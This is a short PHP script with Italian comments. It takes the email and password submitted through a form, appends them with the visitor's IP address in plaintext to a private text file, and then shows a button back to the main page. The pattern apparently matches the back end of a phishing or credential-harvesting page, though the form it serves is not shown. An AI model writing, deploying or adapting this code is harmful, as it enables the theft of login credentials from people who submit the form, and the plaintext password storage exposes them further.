<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mail = $_POST["mail"];
    $password = $_POST["password"];
    $ip = $_SERVER['REMOTE_ADDR'];

    // Apre il file (o lo crea se non esiste) in modalità append
    $file = fopen("../private/info.txt", "a");

    // Scrive il contenuto nel file
    fwrite($file, "Mail: " . $mail . "   Password: " . $password . "   IP= " . $ip . "\n");
    
    // Chiude il file
    fclose($file);
    
    // Aggiungi un link che riporta alla pagina dell'index con stile
    echo '
    <body style="background-color:#333;">
    <button style="border-radius:30px;font-size:100px;background-color:#333;border:3px solid;margin-left:7%;text-transform: uppercase;"><a href="../../index.html" style="text-decoration:none;color:white;" >Torna alla pagina principale</a></button>
    </body>';
}
?>
